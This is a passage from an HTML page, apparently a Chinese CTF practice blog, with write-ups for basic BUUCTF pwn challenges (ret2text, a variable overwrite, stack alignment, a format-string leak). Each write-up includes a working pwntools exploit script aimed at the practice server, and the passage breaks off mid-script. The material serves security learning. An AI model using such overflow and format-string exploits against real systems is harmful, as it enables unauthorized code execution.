@@ -1,0 +1,1996 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.9">
+    
+    
+      
+        <title>第一页 - CTF刷题记录</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.4af4bdda.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/atom-one-dark.min.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    <body dir="ltr">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#_1" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="CTF刷题记录" class="md-header__button md-logo" aria-label="CTF刷题记录" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            CTF刷题记录
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              第一页
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="CTF刷题记录" class="md-nav__button md-logo" aria-label="CTF刷题记录" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    CTF刷题记录
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    首页
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    BUUPWN刷题
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            BUUPWN刷题
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../1第一页/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    第一页
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../2第二页/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    第二页
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../3第三页/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    第三页
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../4第四页/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    第四页
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../5第五页/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    第五页
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    NSSPWN刷题
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            NSSPWN刷题
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../NSSPWN刷题/PWN/1第一页" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    第一页
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1_test_your_nc" class="md-nav__link">
+    <span class="md-ellipsis">
+      题目1_test_your_nc
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2_rip" class="md-nav__link">
+    <span class="md-ellipsis">
+      题目2_rip
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3_warmup_csaw_2016" class="md-nav__link">
+    <span class="md-ellipsis">
+      题目3_warmup_csaw_2016
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4_ciscn_2019_n_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      题目4_ciscn_2019_n_1
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5_pwn1_sctf_2016" class="md-nav__link">
+    <span class="md-ellipsis">
+      题目5_pwn1_sctf_2016
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6_jarvisoj_level0" class="md-nav__link">
+    <span class="md-ellipsis">
+      题目6_jarvisoj_level0
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7_2019-pwn5" class="md-nav__link">
+    <span class="md-ellipsis">
+      题目7_[第五空间2019 决赛]PWN5
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8_jarvisoj_level2" class="md-nav__link">
+    <span class="md-ellipsis">
+      题目8_jarvisoj_level2
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#9_ciscn_2019_n_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      题目9_ciscn_2019_n_8
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#10_bjdctf_2020_babystack" class="md-nav__link">
+    <span class="md-ellipsis">
+      题目10_bjdctf_2020_babystack
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#11_ciscn_2019_c_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      题目11_ciscn_2019_c_1
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#12_jarvisoj_level2_x64" class="md-nav__link">
+    <span class="md-ellipsis">
+      题目12_jarvisoj_level2_x64
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#13_get_started_3dsctf_2016" class="md-nav__link">
+    <span class="md-ellipsis">
+      题目13_get_started_3dsctf_2016
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#14_harekazectf2019baby_rop" class="md-nav__link">
+    <span class="md-ellipsis">
+      题目14_[HarekazeCTF2019]baby_rop
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#15_others_shellcode" class="md-nav__link">
+    <span class="md-ellipsis">
+      题目15_others_shellcode
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#16_ogeek2019babyrop" class="md-nav__link">
+    <span class="md-ellipsis">
+      题目16_[OGeek2019]babyrop
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#17_ciscn_2019_n_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      题目17_ciscn_2019_n_5
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#18_not_the_same_3dsctf_2016" class="md-nav__link">
+    <span class="md-ellipsis">
+      题目18_not_the_same_3dsctf_2016
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#19_ciscn_2019_en_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      题目19_ciscn_2019_en_2
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#20_ciscn_2019_ne_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      题目20_ciscn_2019_ne_5
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#21___2018_rop" class="md-nav__link">
+    <span class="md-ellipsis">
+      题目21_铁人三项(第五赛区)__2018_rop
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#22_bjdctf_2020_babystack2" class="md-nav__link">
+    <span class="md-ellipsis">
+      题目22_bjdctf_2020_babystack2
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#23_jarvisoj_fm" class="md-nav__link">
+    <span class="md-ellipsis">
+      题目23_jarvisoj_fm
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#24_bjdctf_2020_babyrop" class="md-nav__link">
+    <span class="md-ellipsis">
+      题目24_bjdctf_2020_babyrop
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#25_jarvisoj_tell_me_something" class="md-nav__link">
+    <span class="md-ellipsis">
+      题目25_jarvisoj_tell_me_something
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#26_ciscn_2019_es_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      题目26_ciscn_2019_es_2
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#27_harekazectf2019baby_rop2" class="md-nav__link">
+    <span class="md-ellipsis">
+      题目27_[HarekazeCTF2019]baby_rop2
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#28_picoctf_2018_rop-chain" class="md-nav__link">
+    <span class="md-ellipsis">
+      题目28_picoctf_2018_rop chain
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#29_pwn2_sctf_2016" class="md-nav__link">
+    <span class="md-ellipsis">
+      题目29_pwn2_sctf_2016
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#30_jarvisoj_level3" class="md-nav__link">
+    <span class="md-ellipsis">
+      题目30_jarvisoj_level3
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#31_wustctf2020_getshell" class="md-nav__link">
+    <span class="md-ellipsis">
+      题目31_wustctf2020_getshell
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#32_ciscn_2019_s_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      题目32_ciscn_2019_s_3
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="_1">第一页</h1>
+<ul>
+<li>第一页结束，题目比较基础，一晚上基本上就可以刷完，希望能快点刷到堆</li>
+</ul>
+<p><img alt="image-20250412095311465" src="image-20250412095311465.png" /></p>
+<h2 id="1_test_your_nc">题目1_test_your_nc</h2>
+<ul>
+<li>考点：<code>nc</code>远程连接，连接命令：<code>nc ip port</code>，而不是<code>nc ip:port</code></li>
+</ul>
+<p><img alt="image-20250410105752449" src="image-20250410105752449.png" /></p>
+<h2 id="2_rip">题目2_rip</h2>
+<ul>
+<li>考点：<code>ret2text</code></li>
+<li>下载附件后直接逆向这个程序，发现有一个<code>gets()</code>函数，存在栈溢出</li>
+</ul>
+<p><img alt="image-20250410144356747" src="image-20250410144356747.png" /></p>
+<ul>
+<li>同时我们发现了存在危险函数，并且没有开<code>pie</code></li>
+</ul>
+<p><img alt="image-20250410144434880" src="image-20250410144434880.png" /></p>
+<ul>
+<li>所以就直接<code>ret2text</code>，本题exp如下：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="c1">#p = process(&#39;./pwn1&#39;)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">25590</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0xf</span><span class="o">+</span><span class="mh">0x8</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40118A</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p><img alt="image-20250410144600730" src="image-20250410144600730.png" /></p>
+<h2 id="3_warmup_csaw_2016">题目3_warmup_csaw_2016</h2>
+<ul>
+<li>考点：<code>ret2text</code></li>
+<li>查看保护，发现保护全没开</li>
+</ul>
+<p><img alt="image-20250410145204592" src="image-20250410145204592.png" /></p>
+<ul>
+<li>下载附件后直接在使用<code>IDA</code>查看反编译的代码，存在<code>gets</code>函数，可以栈溢出</li>
+</ul>
+<p><img alt="image-20250410145000581" src="image-20250410145000581.png" /></p>
+<ul>
+<li>发现<code>sprintf</code>会输出<code>sub_40060D</code>这个函数的地址，我们来查看一下这个函数，发现是一个类似于后门函数，我们可以得到<code>flag</code>。</li>
+</ul>
+<p><img alt="image-20250410145103218" src="image-20250410145103218.png" /></p>
+<ul>
+<li>直接栈溢出<code>ret2text</code>，exp如下：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="c1">#p = process(&#39;./pwn1&#39;)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">29233</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x40</span><span class="o">+</span><span class="mh">0x8</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40060D</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p><img alt="image-20250410145525136" src="image-20250410145525136.png" /></p>
+<h2 id="4_ciscn_2019_n_1">题目4_ciscn_2019_n_1</h2>
+<ul>
+<li>考点：<code>栈溢出</code></li>
+<li>查看一下保护机制</li>
+</ul>
+<p><img alt="image-20250410200338669" src="image-20250410200338669.png" /></p>
+<ul>
+<li>然后直接<code>IDA pro</code>反编译一下这个程序查看代码。发现<code>main</code>函数就这样输入输出初始化一下，然后调用<code>func()</code>函数</li>
+</ul>
+<p><img alt="image-20250410200406840" src="image-20250410200406840.png" /></p>
+<ul>
+<li>查看<code>func</code>函数，发现存在<code>gets()</code>，还有<code>v2</code>与<code>11.28125</code>比较就能得到<code>flag</code></li>
+</ul>
+<p><img alt="image-20250410200453877" src="image-20250410200453877.png" /></p>
+<ul>
+<li>直接查看数据段，发现<code>11.28125</code>的浮点数十六进制表示如下：</li>
+</ul>
+<p><img alt="image-20250410200615312" src="image-20250410200615312.png" /></p>
+<ul>
+<li>所以直接溢出修改变量即可</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="c1">#p = process(&#39;./ciscn_2019_n_1&#39;)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">25249</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x30</span><span class="o">-</span><span class="mh">0x4</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x41348000</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p><img alt="image-20250410200654444" src="image-20250410200654444.png" /></p>
+<h2 id="5_pwn1_sctf_2016">题目5_pwn1_sctf_2016</h2>
+<ul>
+<li>
+<p>考点：<code>ret2text</code></p>
+</li>
+<li>
+<p>查看一下保护机制，发现如下保护机制，并且是一个<code>32</code>位程序</p>
+</li>
+</ul>
+<p><img alt="image-20250410200751438" src="image-20250410200751438.png" /></p>
+<ul>
+<li>直接使用<code>IDA pro</code>反编译这个程序。发现是一个<code>C++</code>语言的程序，并且<code>main</code>函数如下：</li>
+</ul>
+<p><img alt="image-20250410201155883" src="image-20250410201155883.png" /></p>
+<ul>
+<li>查看一下<code>vuln()</code>函数</li>
+</ul>
+<p><img alt="image-20250410201208783" src="image-20250410201208783.png" /></p>
+<ul>
+<li>这个程序我们正常输入是没办法溢出的，但是这边如果输入<code>I</code>的话会替换成三个字符<code>you</code>。此时我们就可以执行栈溢出操作。</li>
+</ul>
+<p><img alt="image-20250410204540825" src="image-20250410204540825.png" /></p>
+<ul>
+<li>接下来就是计算偏移了</li>
+</ul>
+<p>​   <img alt="image-20250410210859141" src="image-20250410210859141.png" /></p>
+<ul>
+<li>计算得到偏移</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="sa">b</span><span class="s1">&#39;I&#39;</span><span class="o">*</span><span class="p">(</span><span class="mi">21</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span>
+</code></pre></div>
+<ul>
+<li>所以exp如下：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="c1">#p = process(&#39;./pwn1_sctf_2016&#39;)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">27730</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;I&#39;</span><span class="o">*</span><span class="p">(</span><span class="mi">21</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x8048F0D</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p><img alt="image-20250410211231884" src="image-20250410211231884.png" /></p>
+<h2 id="6_jarvisoj_level0">题目6_jarvisoj_level0</h2>
+<ul>
+<li>考点：<code>ret2text</code>、<code>栈对齐</code></li>
+<li>先查看一下保护机制，保护机制如下</li>
+</ul>
+<p><img alt="image-20250410211531209" src="image-20250410211531209.png" /></p>
+<ul>
+<li>然后就逆向这个程序，查看这个程序的运行逻辑。先看<code>main</code>函数</li>
+</ul>
+<p><img alt="image-20250410211611202" src="image-20250410211611202.png" /></p>
+<ul>
+<li>查看<code>return</code>的这个函数，发现是一个栈溢出漏洞</li>
+</ul>
+<p><img alt="image-20250410211625117" src="image-20250410211625117.png" /></p>
+<ul>
+<li>同时这里还存在<code>shell</code></li>
+</ul>
+<p><img alt="image-20250410211652024" src="image-20250410211652024.png" /></p>
+<ul>
+<li>直接<code>ret2text</code>，注意在溢出返回到<code>shell</code>的时候需要注意栈需要与<code>0x10</code>对齐，否则程序无法正常执行<code>system("/bin/sh")</code>exp如下：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./level0&#39;</span><span class="p">)</span>
+<span class="c1">#p = remote(&#39;node5.buuoj.cn&#39;,27730)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x80</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4005A5</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x400596</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p><img alt="image-20250410212618785" src="image-20250410212618785.png" /></p>
+<h2 id="7_2019-pwn5">题目7_[第五空间2019 决赛]PWN5</h2>
+<ul>
+<li>考点：<code>随机数</code>、<code>格式化字符串漏洞</code></li>
+<li>先查看一下保护机制</li>
+</ul>
+<p><img alt="image-20250410212710785" src="image-20250410212710785.png" /></p>
+<ul>
+<li>现在逆向一下这个程序，发现是直接获取程序随机数，然后将随机数写入到<code>bss</code>段中。</li>
+<li>之后让用户输入两次，第一次输入的时候会有一次格式化字符串漏洞</li>
+<li>第二次输入就是输入一个数，将该数与随机数进行判断，相等就可以得到<code>shell</code></li>
+</ul>
+<p><img alt="image-20250410212743362" src="image-20250410212743362.png" /></p>
+<ul>
+<li>直接先写入<code>bss</code>段存储随机数的地址，这样我们就能使用<code>%s</code>进行泄露，现在计算偏移，确定偏移为<code>10</code></li>
+</ul>
+<p><img alt="image-20250410214717207" src="image-20250410214717207.png" /></p>
+<ul>
+<li>直接使用<code>%10$s</code>写入随机数，这时我们接收随机数输入到那边即可得到<code>shell</code>，注意我们发送的时候要字符串<code>ascii</code>码形式，因为后面有<code>atoi()</code>这个函数。</li>
+<li>exp如下：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="c1">#p = process(&#39;./pwn&#39;)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">26635</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span>  <span class="n">p32</span><span class="p">(</span><span class="mh">0x804C044</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;%10$s&#39;</span>
